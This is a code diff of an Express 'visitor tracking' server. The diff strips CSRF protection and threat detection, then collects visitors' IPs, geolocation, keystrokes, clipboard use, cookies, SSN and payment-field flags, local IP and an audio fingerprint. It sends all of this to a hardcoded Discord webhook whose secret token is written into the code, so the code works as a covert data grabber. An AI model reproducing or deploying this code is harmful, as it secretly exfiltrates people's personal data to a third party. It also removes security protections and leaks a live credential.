@@ -4,13 +4,13 @@ const useragent = require('useragent');
 const rateLimit = require('express-rate-limit');
 const { v4: uuidv4 } = require('uuid');
 const winston = require('winston');
-const csrf = require('csurf');
 const cookieParser = require('cookie-parser');
 const fs = require('fs').promises;
 const path = require('path');
 
 const app = express();
 
+// quick logger setup
 const logger = winston.createLogger({
   level: 'info',
   format: winston.format.combine(
@@ -23,81 +23,70 @@ const logger = winston.createLogger({
   ]
 });
 
+// file for tracking repeat visitors
 const visitorsFile = path.join(__dirname, 'visitors.json');
 
-async function loadVisitors() {
+async function grabVisitors() {
   try {
-    const data = await fs.readFile(visitorsFile, 'utf8');
-    return JSON.parse(data);
-  } catch (err) {
-    if (err.code === 'ENOENT') {
+    const stuff = await fs.readFile(visitorsFile, 'utf8');
+    return JSON.parse(stuff);
+  } catch (oops) {
+    if (oops.code === 'ENOENT') {
       return {};
     }
-    logger.error('Error loading visitors file', { error: err.message });
+    logger.error(' couldnt load visitors', { err: oops.message });
     return {};
   }
 }
 
-async function saveVisitors(visitors) {
+async function dumpVisitors(data) {
   try {
-    await fs.writeFile(visitorsFile, JSON.stringify(visitors, null, 2));
-  } catch (err) {
-    logger.error('Error saving visitors file', { error: err.message });
+    await fs.writeFile(visitorsFile, JSON.stringify(data, null, 2));
+  } catch (oops) {
+    logger.error('save failed lol', { err: oops.message });
   }
 }
 
+// rate limit to avoid spam
 const limiter = rateLimit({
-  windowMs: 15 * 60 * 1000,
+  windowMs: 15 * 60 * 1000, // 15 mins
   max: 100,
   standardHeaders: true,
   legacyHeaders: false
 });
 
+// cors stuff, only allow these origins
 app.use(cors({
-  origin: (origin, callback) => {
-    const allowedOrigins = [
+  origin: (origin, cb) => {
+    const okOrigins = [
       'http://localhost:3000',
       'https://random-nfpf.onrender.com',
       'https://vanprojects.netlify.app',
       'https://artifacts.grokusercontent.com'
     ];
-    if (!origin || allowedOrigins.includes(origin)) {
-      callback(null, origin || '*');
+    if (!origin || okOrigins.includes(origin)) {
+      cb(null, origin || '*');
     } else {
-      logger.warn('CORS Misconfiguration Attempt', { origin });
-      callback(new Error('Not allowed by CORS'));
+      logger.warn('bad cors try', { origin });
+      cb(new Error('cors no'));
     }
   },
   credentials: true
 }));
+
 app.use(cookieParser());
 app.use(express.json());
 app.use(express.static('public'));
 app.use(limiter);
 
-const csrfProtection = csrf({
-  cookie: {
-    httpOnly: true,
-    secure: process.env.NODE_ENV === 'production',
-    sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax'
-  }
-});
-app.use(csrfProtection);
-
+// just make a session id each time
 app.use((req, res, next) => {
-  req.sessionId = req.headers['x-session-id'] || uuidv4();
-  res.setHeader('X-Session-ID', req.sessionId);
-  res.setHeader('X-CSRF-Token', req.csrfToken());
-  logger.info('Generated CSRF token', { sessionId: req.sessionId, csrfToken: req.csrfToken() });
+  req.sessionId = uuidv4();
+  logger.info('new session id', { id: req.sessionId });
   next();
 });
 
-app.get('/csrf-token', csrfProtection, (req, res) => {
-  const token = req.csrfToken();
-  logger.info('Served CSRF token', { token, sessionId: req.sessionId });
-  res.json({ csrfToken: token });
-});
-
+// main page
 app.get('/index.html', (req, res) => {
   res.send(`
     <!DOCTYPE html>
@@ -105,7 +94,6 @@ app.get('/index.html', (req, res) => {
     <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
-      <meta name="csrf-token" content="${req.csrfToken()}">
       <title>Visitor Tracking</title>
     </head>
     <body>
@@ -117,13 +105,14 @@ app.get('/index.html', (req, res) => {
 });
 
 app.get('/', (req, res) => {
-  res.send('Tf you doing here.');
+  res.send('what are you doing here?');
 });
 
-function getClientIP(req) {
-  const allIPs = new Set();
+// pull ips from headers
+function pullClientIp(req) {
+  const ipsSet = new Set();
 
-  const ipHeaders = [
+  const headersToCheck = [
     'x-forwarded-for',
     'cf-connecting-ip',
     'true-client-ip',
@@ -135,68 +124,64 @@ function getClientIP(req) {
     'x-original-forwarded-for'
   ];
 
-  for (const header of ipHeaders) {
-    const value = req.headers[header];
-    if (value) {
+  for (const hdr of headersToCheck) {
+    const val = req.headers[hdr];
+    if (val) {
       let ips = [];
-      if (header === 'forwarded') {
-        const forwards = value.split(',').map(part => part.match(/for=([^;,\s]+)/i)?.[1]?.replace(/[\[\]"]/g, '').trim());
-        ips = forwards.filter(ip => ip && isValidIP(ip));
+      if (hdr === 'forwarded') {
+        const parts = val.split(',').map(p => p.match(/for=([^;,\s]+)/i)?.[1]?.replace(/[\[\]"]/g, '').trim());
+        ips = parts.filter(ip => ip && checkIp(ip));
       } else {
-        ips = value.split(',').map(ip => ip.trim()).filter(ip => isValidIP(ip));
+        ips = val.split(',').map(ip => ip.trim()).filter(ip => checkIp(ip));
       }
-      ips.forEach(ip => allIPs.add(ip));
+      ips.forEach(ip => ipsSet.add(ip));
     }
   }
 
-  const socketIP = req.socket.remoteAddress?.replace(/^::ffff:/, '');
-  if (isValidIP(socketIP)) {
-    allIPs.add(socketIP);
+  const sockIp = req.socket.remoteAddress?.replace(/^::ffff:/, '');
+  if (checkIp(sockIp)) {
+    ipsSet.add(sockIp);
   }
 
-  const allIPsArray = Array.from(allIPs);
-  const primary = allIPsArray[0] || '127.0.0.1';
+  const allIps = Array.from(ipsSet);
+  const mainOne = allIps[0] || '127.0.0.1';
 
-  logger.info('Detected IPs', { primary, all: allIPsArray });
+  logger.info('got ips', { main: mainOne, all: allIps });
 
-  return { primary, all: allIPsArray };
+  return { primary: mainOne, all: allIps };
 }
 
-function isValidIP(ip) {
+// ip validator
+function checkIp(ip) {
   if (!ip) return false;
 
-  const ipv4Regex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
-  if (ipv4Regex.test(ip)) return true;
+  const v4Pat = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
+  if (v4Pat.test(ip)) return true;
 
-  const ipv6Regex = /^([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)$/;
-  return ipv6Regex.test(ip);
+  // ipv6 pattern, long but whatever
+  const v6Pat = /^([0-9a-fA-F]{1,4}:){7,7}[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,7}:|([0-9a-fA-F]{1,4}:){1,6}:[0-9a-fA-F]{1,4}|([0-9a-fA-F]{1,4}:){1,5}(:[0-9a-fA-F]{1,4}){1,2}|([0-9a-fA-F]{1,4}:){1,4}(:[0-9a-fA-F]{1,4}){1,3}|([0-9a-fA-F]{1,4}:){1,3}(:[0-9a-fA-F]{1,4}){1,4}|([0-9a-fA-F]{1,4}:){1,2}(:[0-9a-fA-F]{1,4}){1,5}|[0-9a-fA-F]{1,4}:((:[0-9a-fA-F]{1,4}){1,6})|:((:[0-9a-fA-F]{1,4}){1,7}|:)$/;
+  return v6Pat.test(ip);
 }
 
-function processReferrer(req) {
-  const clientReferrer = req.body.part1?.referrer || 'Direct';
-  const serverReferrer = req.headers['referer'] || 'Direct';
-  const platforms = [
-    { domain: 'facebook.com', name: 'Facebook' },
-    { domain: 'discord.com', name: 'Discord' },
-    { domain: 'youtube.com', name: 'YouTube' },
-    { domain: 't.co', name: 'Twitter' },
-    { domain: 'reddit.com', name: 'Reddit' },
-    { domain: 'tiktok.com', name: 'TikTok' },
-    { domain: 'instagram.com', name: 'Instagram' }
-  ];
-  if (clientReferrer !== 'Direct' && clientReferrer !== 'Unknown (Invalid Referrer)') {
-    return clientReferrer;
+// figure out where they came from
+function figureReferrer(req) {
+  let clientRef = req.body.part1?.referrer || 'Direct';
+  const servRef = req.headers['referer'] || 'Direct';
+  if (clientRef !== 'Direct' && clientRef !== 'Unknown (Invalid Referrer)') {
+    return clientRef;
   }
-  if (serverReferrer !== 'Direct') {
+  if (servRef !== 'Direct') {
     try {
-      const url = new URL(serverReferrer);
-      const hostname = url.hostname.toLowerCase();
-      for (const platform of platforms) {
-        if (hostname.includes(platform.domain)) {
-          return platform.name;
-        }
-      }
-      return serverReferrer;
+      const u = new URL(servRef);
+      const host = u.hostname.toLowerCase();
+      if (host.includes('facebook.com')) return 'Facebook';
+      if (host.includes('discord.com')) return 'Discord';
+      if (host.includes('youtube.com')) return 'YouTube';
+      if (host.includes('t.co')) return 'Twitter';
+      if (host.includes('reddit.com')) return 'Reddit';
+      if (host.includes('tiktok.com')) return 'TikTok';
+      if (host.includes('instagram.com')) return 'Instagram';
+      return servRef;
     } catch (e) {
       return 'Unknown (Invalid Server Referrer)';
     }
@@ -204,556 +189,299 @@ function processReferrer(req) {
   return 'Direct';
 }
 
-function detectSecurityThreats(req, visitorInfo) {
-  const threats = [];
+// the visit endpoint
+app.post('/api/visit', async (req, res) => {
+  console.log('got a visit post'); // debug
+  logger.info('visit req', {
+    hdrs: req.headers,
+    cks: req.cookies,
+    bod: req.body
+  });
+  const ipStuff = pullClientIp(req);
+  const mainIp = ipStuff.primary;
 
-  if (req.body.part4?.inlineScripts?.length || req.body.part4?.cookieAccess) {
-    threats.push({
-      type: 'XSS',
-      details: `Detected ${req.body.part4?.inlineScripts?.length || 0} inline scripts and cookie access: ${req.body.part4?.cookieAccess}`,
-      category: 'part4'
+  const geoRes = await fetch(`http://ip-api.com/json/${mainIp}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,mobile,proxy,hosting`);
+  const geo = await geoRes.json();
+
+  if (geo.status === 'fail') {
+    logger.error('geo fail', { msg: geo.message, ip: mainIp });
+    return res.status(400).send('bad ip');
+  }
+
+  const ua = useragent.parse(req.headers['user-agent']);
+  const ref = figureReferrer(req);
+
+  let plugs = req.body.part3?.plugins ? Array.isArray(req.body.part3.plugins) ? req.body.part3.plugins : [] : [];
+  let mimes = req.body.part3?.mimeTypes ? Array.isArray(req.body.part3.mimeTypes) ? req.body.part3.mimeTypes : [] : [];
+
+  let vid = req.cookies.visitorId;
+  if (!vid) {
+    vid = uuidv4();
+    res.cookie('visitorId', vid, {
+      maxAge: 365 * 24 * 60 * 60 * 1000, // year
+      httpOnly: true,
+      secure: process.env.NODE_ENV === 'production',
+      sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax'
     });
   }
 
-  if ((req.headers['referer'] || req.body.part1?.referrer)?.includes('token=') || (req.headers['referer'] || req.body.part1?.referrer)?.includes('auth=')) {
-    threats.push({
-      type: 'Referrer Leakage',
-      details: `Sensitive data in referrer: ${req.headers['referer'] || req.body.part1?.referrer}`,
-      category: 'part1'
-    });
-  }
+  const visits = await grabVisitors();
+  let vdata = visits[vid] || { count: 0, last: null };
+  const now = new Date().toISOString();
+  const prev = vdata.last || 'First time';
+  const cnt = vdata.count + 1;
+  vdata = { count: cnt, last: now };
+  visits[vid] = vdata;
+  await dumpVisitors(visits);
 
-  if (!req.body.part1?.referrer && !req.headers['referer']) {
-    threats.push({
-      type: 'Missing Referrer',
-      details: 'No referrer provided by client or server',
-      category: 'part1'
-    });
-  }
-
-  if ((req.body.part1?.referrer === 'Unknown (Invalid Referrer)' || req.headers['referer'] === 'Unknown (Invalid Server Referrer)') && req.body.part1?.referrer !== 'Direct') {
-    threats.push({
-      type: 'Invalid Referrer',
-      details: 'Malformed or unparsable referrer detected',
-      category: 'part1'
-    });
-  }
-
-  if (req.body.part4?.thirdPartyRequests?.length) {
-    threats.push({
-      type: 'Cookie Syncing',
-      details: `Third-party requests to: ${req.body.part4?.thirdPartyRequests.join(', ')}`,
-      category: 'part4'
-    });
-  }
-
-  if (req.cookies && Object.values(req.cookies).some(value => value.includes('.'))) {
-    threats.push({
-      type: 'Subdomain Cookie Scope Abuse',
-      details: 'Broad cookie value detected',
-      category: 'part2'
-    });
-  }
-
-  if (req.cookies && Object.keys(req.cookies).length > 0 && Object.values(req.cookies).some(value => value.length > 100 || value.includes('session') || value.includes('token'))) {
-    threats.push({
-      type: 'Suspicious Cookie Content',
-      details: `Potentially sensitive or oversized cookies detected: ${JSON.stringify(Object.keys(req.cookies))}`,
-      category: 'part2'
-    });
-  }
-
-  if (!req.secure && process.env.NODE_ENV === 'production') {
-    threats.push({
-      type: 'MITM Risk',
-      details: 'Insecure HTTP connection detected',
-      category: 'part2'
-    });
-  }
-
-  if (req.body.part4?.postMessageCalls?.length) {
-    threats.push({
-      type: 'PostMessage Misuse',
-      details: `Unverified postMessage calls: ${req.body.part4?.postMessageCalls.join(', ')}`,
-      category: 'part4'
-    });
-  }
-
-  if (req.body.part3?.keystrokes && req.body.part3.keystrokes.includes('password')) {
-    threats.push({
-      type: 'Sensitive Keylogging',
-      details: 'Potentially sensitive data detected in keystrokes',
-      category: 'part3'
-    });
-  }
-
-  if (req.body.part3?.clipboardAccess !== 'None') {
-    threats.push({
-      type: 'Clipboard Access',
-      details: `Clipboard interaction detected: ${req.body.part3.clipboardAccess}`,
-      category: 'part3'
-    });
-  }
-
-  if (req.body.part3?.ssnPatternDetected !== 'None') {
-    threats.push({
-      type: 'SSN Pattern',
-      details: 'SSN-like pattern detected in input',
-      category: 'part3'
-    });
-  }
-
-  if (req.body.part3?.emailPatternDetected !== 'None') {
-    threats.push({
-      type: 'Email Pattern',
-      details: 'Email-like pattern detected in input',
-      category: 'part3'
-    });
-  }
-
-  if (req.body.part3?.paymentFieldInteraction !== 'None') {
-    threats.push({
-      type: 'Payment Field Interaction',
-      details: 'Input detected in payment-related field',
-      category: 'part3'
-    });
-  }
-
-  if (req.body.part3?.utmParameters && JSON.parse(req.body.part3.utmParameters || '{}').utm_source?.includes('token')) {
-    threats.push({
-      type: 'Suspicious UTM Parameter',
-      details: 'Potential sensitive data in UTM parameters',
-      category: 'part3'
-    });
-  }
-
-  if (req.body.part3?.eventLog?.includes('password') || req.body.part3?.eventLog?.includes('card') || req.body.part3?.eventLog?.includes('ssn')) {
-    threats.push({
-      type: 'Sensitive Event',
-      details: 'Potentially sensitive data in event log',
-      category: 'part3'
-    });
-  }
-
-  if (req.body.part4?.clientCookies && (req.body.part4.clientCookies.includes('token') || req.body.part4.clientCookies.includes('session'))) {
-    threats.push({
-      type: 'Sensitive Client Cookies',
-      details: 'Potentially sensitive data in client-sent cookies',
-      category: 'part4'
-    });
-  }
-
-  if (req.body.part4?.localStorageUsage > 0) {
-    threats.push({
-      type: 'Local Storage Monitoring',
-      details: `Local storage usage detected: ${req.body.part4.localStorageUsage} bytes`,
-      category: 'part4'
-    });
-  }
-
-  if (req.body.part1?.location !== 'Unknown' && req.body.part1?.location.latitude === 0 && req.body.part1?.location.longitude === 0) {
-    threats.push({
-      type: 'Suspicious Location',
-      details: 'Device location coordinates (0, 0) detected',
-      category: 'part1'
-    });
-  }
-
-  return threats;
-}
-
-app.post('/api/visit', csrfProtection, async (req, res) => {
-  try {
-    logger.info('Received /api/visit request', {
-      headers: req.headers,
-      cookies: req.cookies,
-      body: req.body
-    });
-    const ipInfo = getClientIP(req);
-    const ip = ipInfo.primary;
-
-    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=status,message,country,regionName,city,zip,lat,lon,isp,org,as,query,mobile,proxy,hosting`);
-    const geoData = await geoResponse.json();
-
-    if (geoData.status === 'fail') {
-      logger.error('Geolocation API error', { message: geoData.message, ip });
-      return res.status(400).send('Invalid IP address');
+  // big info obj
+  const info = {
+    vid: vid,
+    cnt: cnt,
+    prev: prev,
+    sid: req.sessionId,
+    ip: geo.query,
+    allips: ipStuff.all,
+    country: geo.country,
+    reg: geo.regionName,
+    city: geo.city,
+    zip: geo.zip,
+    lat: geo.lat,
+    lon: geo.lon,
+    isp: geo.isp,
+    org: geo.org,
+    as: geo.as,
+    mob: geo.mobile,
+    prox: geo.proxy,
+    host: geo.hosting,
+    dev: req.body.part1?.device || '??',
+    ts: req.body.part1?.timestamp || now,
+    brow: ua.toAgent(),
+    os: ua.os.toString(),
+    dtype: ua.device.toString(),
+    ref: ref,
+    lang: req.headers['accept-language'] || '??',
+    accept: req.headers['accept'] || '??',
+    conn: req.headers['connection'] || '??',
+    meth: req.method,
+    path: req.originalUrl,
+    uaraw: req.headers['user-agent'],
+    screen: req.body.part1?.screenSize || '??',
+    coldep: req.body.part3?.colorDepth || '??',
+    tz: req.body.part3?.timezone || '??',
+    lng: req.body.part3?.language || '??',
+    hconc: req.body.part3?.hardwareConcurrency || '??',
+    dmem: req.body.part3?.deviceMemory || '??',
+    dnt: req.body.part3?.doNotTrack || '??',
+    plugs: plugs,
+    mimes: mimes,
+    inlines: req.body.part4?.inlineScripts || [],
+    ckacc: req.body.part4?.cookieAccess || false,
+    tpreqs: req.body.part4?.thirdPartyRequests || [],
+    pmcalls: req.body.part4?.postMessageCalls || [],
+    touch: req.body.part3?.touchSupport || '??',
+    batt: req.body.part3?.batteryStatus || '??',
+    curl: req.body.part1?.currentUrl || '??',
+    scroll: req.body.part3?.scrollPosition || '??',
+    cks: JSON.stringify(req.cookies) || '{}',
+    loc: req.body.part1?.location || '??',
+    p3: {
+      keys: req.body.part3?.keystrokes || 'none',
+      mousef: req.body.part3?.mouseMovementFrequency || '??',
+      wgl: req.body.part3?.webglSupport || '??',
+      connt: req.body.part3?.connectionType || '??',
+      clip: req.body.part3?.clipboardAccess || 'none',
+      orient: req.body.part3?.deviceOrientationSupport || '??',
+      sessstor: req.body.part3?.sessionStorageUsage || '??',
+      feats: req.body.part3?.browserFeatures || 'none',
+      loadt: req.body.part3?.pageLoadTime || '??',
+      inter: req.body.part3?.userInteractionCount || 0,
+      ssnpat: req.body.part3?.ssnPatternDetected || 'none',
+      emailpat: req.body.part3?.emailPatternDetected || 'none',
+      payint: req.body.part3?.paymentFieldInteraction || 'none',
+      utms: req.body.part3?.utmParameters || '{}',
+      clicks: req.body.part3?.clickedElements || 'none',
+      sessdur: req.body.part3?.sessionDuration || '??',
+      evlog: req.body.part3?.eventLog || 'none'
+    },
+    p4: {
+      clcks: req.body.part4?.clientCookies || 'none',
+      locstor: req.body.part4?.localStorageUsage || '??',
+      locip: req.body.part4?.localIP || '??',
+      audfp: req.body.part4?.audioFingerprint || 'none'
     }
+  };
 
-    const agent = useragent.parse(req.headers['user-agent']);
-    const referer = processReferrer(req);
+  logger.info('visitor data', info);
 
-    const plugins = req.body.part3?.plugins ? Array.isArray(req.body.part3.plugins) ? req.body.part3.plugins : [] : [];
-    const mimeTypes = req.body.part3?.mimeTypes ? Array.isArray(req.body.part3.mimeTypes) ? req.body.part3.mimeTypes : [] : [];
+  const hook = 'https://ptb.discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq';
 
-    let visitorId = req.cookies.visitorId;
-    if (!visitorId) {
-      visitorId = uuidv4();
-      res.cookie('visitorId', visitorId, {
-        maxAge: 365 * 24 * 60 * 60 * 1000,
-        httpOnly: true,
-        secure: process.env.NODE_ENV === 'production',
-        sameSite: process.env.NODE_ENV === 'production' ? 'None' : 'Lax'
-      });
-    }
+  // fields for discord
+  const flds = [
+    { name: 'Visitor ID', value: info.vid, inline: true },
+    { name: 'Visit Count', value: info.cnt.toString(), inline: true },
+    { name: 'Last Visit', value: info.prev, inline: true },
+    { name: 'Session ID', value: info.sid, inline: true },
+    { name: 'IP', value: info.ip, inline: true },
+    { name: 'All IPs', value: info.allips.join(', ') || 'n/a', inline: true },
+    { name: 'Device', value: info.dev, inline: true },
+    { name: 'Referer', value: info.ref, inline: true },
+    { name: 'Current URL', value: info.curl, inline: true },
+    { name: 'Timestamp', value: info.ts, inline: true },
+    { name: 'Country', value: info.country, inline: true },
+    { name: 'City', value: info.city, inline: true },
+    { name: 'Coordinates', value: `(${info.lat}, ${info.lon})`, inline: true },
+    { name: 'Device Location', value: info.loc !== 'Unknown' ? `(${info.loc.latitude}, ${info.loc.longitude}, Acc: ${info.loc.accuracy}m)` : info.loc, inline: true },
+    { name: 'ISP', value: info.isp, inline: true },
+    { name: 'Mobile', value: info.mob ? 'Yes' : 'No', inline: true },
+    { name: 'Proxy', value: info.prox ? 'Yes' : 'No', inline: true },
+    { name: 'Hosting', value: info.host ? 'Yes' : 'No', inline: true },
+    { name: 'Browser', value: info.brow, inline: true },
+    { name: 'OS', value: info.os, inline: true },
+    { name: 'Device Type', value: info.dtype, inline: true },
+    { name: 'Screen Size', value: info.screen, inline: true },
+    { name: 'Timezone', value: info.tz, inline: true },
+    { name: 'Language', value: info.lng, inline: true },
+    { name: 'Accept Language', value: info.lang, inline: true },
+    { name: 'Touch Support', value: info.touch, inline: true },
+    { name: 'Battery Status', value: info.batt, inline: true },
+    { name: 'Color Depth', value: info.coldep, inline: true },
+    { name: 'Hardware Concurrency', value: info.hconc, inline: true },
+    { name: 'Device Memory', value: info.dmem, inline: true },
+    { name: 'Do Not Track', value: info.dnt, inline: true },
+    { name: 'Connection', value: info.conn, inline: true },
+    { name: 'Scroll Position', value: info.scroll, inline: true },
+    { name: 'Cookies (Server)', value: info.cks, inline: true },
+    { name: 'Keystrokes', value: info.p3.keys, inline: true },
+    { name: 'Mouse Frequency', value: info.p3.mousef, inline: true },
+    { name: 'WebGL Support', value: info.p3.wgl, inline: true },
+    { name: 'Connection Type', value: info.p3.connt, inline: true },
+    { name: 'Clipboard Access', value: info.p3.clip, inline: true },
+    { name: 'Device Orientation', value: info.p3.orient, inline: true },
+    { name: 'Session Storage', value: info.p3.sessstor, inline: true },
+    { name: 'Browser Features', value: info.p3.feats, inline: true },
+    { name: 'Page Load Time', value: info.p3.loadt, inline: true },
+    { name: 'Interaction Count', value: info.p3.inter.toString(), inline: true },
+    { name: 'SSN Pattern', value: info.p3.ssnpat, inline: true },
+    { name: 'Email Pattern', value: info.p3.emailpat, inline: true },
+    { name: 'Payment Interaction', value: info.p3.payint, inline: true },
+    { name: 'UTM Parameters', value: info.p3.utms, inline: true },
+    { name: 'Clicked Elements', value: info.p3.clicks, inline: true },
+    { name: 'Session Duration', value: info.p3.sessdur, inline: true },
+    { name: 'Event Log', value: info.p3.evlog, inline: true },
+    { name: 'Client Cookies', value: info.p4.clcks, inline: true },
+    { name: 'Local Storage Usage', value: info.p4.locstor, inline: true },
+    { name: 'Local IP', value: info.p4.locip, inline: true },
+    { name: 'Audio Fingerprint', value: info.p4.audfp, inline: true }
+  ];
 
-    const visitors = await loadVisitors();
-    let visitorData = visitors[visitorId] || { count: 0, lastVisit: null };
-    const currentVisit = new Date().toISOString();
-    const lastVisit = visitorData.lastVisit || 'First Visit';
-    const visitCount = visitorData.count + 1;
-    visitorData = { count: visitCount, lastVisit: currentVisit };
-    visitors[visitorId] = visitorData;
-    await saveVisitors(visitors);
+  const p1f = flds.slice(0, 18);
+  const p2f = flds.slice(18, 33);
+  const p3f = flds.slice(33, 48);
+  const p4f = flds.slice(48);
 
-    const visitorInfo = {
-      visitorId: visitorId,
-      visitCount: visitCount,
-      lastVisit: lastVisit,
-      sessionId: req.sessionId,
-      ip: geoData.query,
-      allIPs: ipInfo.all,
-      country: geoData.country,
-      region: geoData.regionName,
-      city: geoData.city,
-      zip: geoData.zip,
-      latitude: geoData.lat,
-      longitude: geoData.lon,
-      isp: geoData.isp,
-      organization: geoData.org,
-      as: geoData.as,
-      mobile: geoData.mobile,
-      proxy: geoData.proxy,
-      hosting: geoData.hosting,
-      device: req.body.part1?.device || 'Unknown',
-      timestamp: req.body.part1?.timestamp || currentVisit,
-      browser: agent.toAgent(),
-      os: agent.os.toString(),
-      deviceType: agent.device.toString(),
-      referer: referer,
-      acceptLanguage: req.headers['accept-language'] || 'Unknown',
-      accept: req.headers['accept'] || 'Unknown',
-      connection: req.headers['connection'] || 'Unknown',
-      requestMethod: req.method,
-      requestPath: req.originalUrl,
-      userAgentRaw: req.headers['user-agent'],
-      screenSize: req.body.part1?.screenSize || 'Unknown',
-      colorDepth: req.body.part3?.colorDepth || 'Unknown',
-      timezone: req.body.part3?.timezone || 'Unknown',
-      language: req.body.part3?.language || 'Unknown',
-      hardwareConcurrency: req.body.part3?.hardwareConcurrency || 'Unknown',
-      deviceMemory: req.body.part3?.deviceMemory || 'Unknown',
-      doNotTrack: req.body.part3?.doNotTrack || 'Unknown',
-      plugins: plugins,
-      mimeTypes: mimeTypes,
-      inlineScripts: req.body.part4?.inlineScripts || [],
-      cookieAccess: req.body.part4?.cookieAccess || false,
-      thirdPartyRequests: req.body.part4?.thirdPartyRequests || [],
-      postMessageCalls: req.body.part4?.postMessageCalls || [],
-      touchSupport: req.body.part3?.touchSupport || 'Unknown',
-      batteryStatus: req.body.part3?.batteryStatus || 'Unknown',
-      currentUrl: req.body.part1?.currentUrl || 'Unknown',
-      scrollPosition: req.body.part3?.scrollPosition || 'Unknown',
-      cookies: JSON.stringify(req.cookies) || '{}',
-      location: req.body.part1?.location || 'Unknown',
-      part3: {
-        keystrokes: req.body.part3?.keystrokes || 'None',
-        mouseMovementFrequency: req.body.part3?.mouseMovementFrequency || 'Unknown',
-        webglSupport: req.body.part3?.webglSupport || 'Unknown',
-        connectionType: req.body.part3?.connectionType || 'Unknown',
-        clipboardAccess: req.body.part3?.clipboardAccess || 'None',
-        deviceOrientationSupport: req.body.part3?.deviceOrientationSupport || 'Unknown',
-        sessionStorageUsage: req.body.part3?.sessionStorageUsage || 'Unknown',
-        browserFeatures: req.body.part3?.browserFeatures || 'None',
-        pageLoadTime: req.body.part3?.pageLoadTime || 'Unknown',
-        userInteractionCount: req.body.part3?.userInteractionCount || 0,
-        ssnPatternDetected: req.body.part3?.ssnPatternDetected || 'None',
-        emailPatternDetected: req.body.part3?.emailPatternDetected || 'None',
-        paymentFieldInteraction: req.body.part3?.paymentFieldInteraction || 'None',
-        utmParameters: req.body.part3?.utmParameters || '{}',
-        clickedElements: req.body.part3?.clickedElements || 'None',
-        sessionDuration: req.body.part3?.sessionDuration || 'Unknown',
-        eventLog: req.body.part3?.eventLog || 'None'
-      },
-      part4: {
-        clientCookies: req.body.part4?.clientCookies || 'None',
-        localStorageUsage: req.body.part4?.localStorageUsage || 'Unknown',
-        localIP: req.body.part4?.localIP || 'Unknown',
-        audioFingerprint: req.body.part4?.audioFingerprint || 'None'
-      }
-    };
+  const pay1 = {
+    embeds: [{
+      title: 'New Visitor! (Part 1 - Basics)',
+      color: 0x3498db,
+      timestamp: info.ts,
+      fields: p1f
+    }]
+  };
 
-    const threats = detectSecurityThreats(req, visitorInfo);
-    if (threats.length) {
-      logger.warn('Security Threats Detected', { threats, visitorInfo });
-    }
+  const pay2 = {
+    embeds: [{
+      title: 'New Visitor! (Part 2 - Device Stuff)',
+      color: 0x2ecc71,
+      timestamp: info.ts,
+      fields: p2f
+    }]
+  };
 
-    logger.info('Visitor Info', { ...visitorInfo, threats });
+  const pay3 = {
+    embeds: [{
+      title: 'New Visitor! (Part 3 - User Actions)',
+      color: 0xf1c40f,
+      timestamp: info.ts,
+      fields: p3f
+    }]
+  };
 
-    const threatsByPart = {
-      part1: threats.filter(t => t.category === 'part1'),
-      part2: threats.filter(t => t.category === 'part2'),
-      part3: threats.filter(t => t.category === 'part3'),
-      part4: threats.filter(t => t.category === 'part4' || !t.category)
-    };
+  const pay4 = {
+    embeds: [{
+      title: 'New Visitor! (Part 4 - Prints)',
+      color: 0xe74c3c,
+      timestamp: info.ts,
+      fields: p4f
+    }]
+  };
 
-    const getColor = (partThreats, totalThreats) => {
-      if (partThreats.length > 0) {
-        return 0xff0000; // red
-      } else if (totalThreats > 0) {
-        return 0xffa500; // orange
-      } else {
-        return 0x00ff00; // green
-      }
-    };
+  // send to discord with delays
+  await fetch(hook, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify(pay1)
+  }).then(resp => {
+    if (!resp.ok) logger.error('part1 send fail');
+    else logger.info('part1 sent');
+  });
 
-    const webhookURL = 'https://ptb.discord.com/api/webhooks/1423009299826868396/7ezGh2CAQRooHIvE5sXCBGW0AAgFE2Ku8aFqUDe2eqC2BG7quehvy6JBgWqSwfhrROAq';
+  await new Promise(r => setTimeout(r, 2000));
 
-    const fields = [
-      { name: 'Visitor ID', value: visitorInfo.visitorId, inline: true },
-      { name: 'Visit Count', value: visitorInfo.visitCount.toString(), inline: true },
-      { name: 'Last Visit', value: visitorInfo.lastVisit, inline: true },
-      { name: 'Session ID', value: visitorInfo.sessionId, inline: true },
-      { name: 'IP', value: visitorInfo.ip, inline: true },
-      { name: 'All IPs', value: visitorInfo.allIPs.join(', ') || 'N/A', inline: true },
-      { name: 'Device', value: visitorInfo.device, inline: true },
-      { name: 'Referer', value: visitorInfo.referer, inline: true },
-      { name: 'Current URL', value: visitorInfo.currentUrl, inline: true },
-      { name: 'Timestamp', value: visitorInfo.timestamp, inline: true },
-      { name: 'Country', value: visitorInfo.country, inline: true },
-      { name: 'City', value: visitorInfo.city, inline: true },
-      { name: 'Coordinates', value: `(${visitorInfo.latitude}, ${visitorInfo.longitude})`, inline: true },
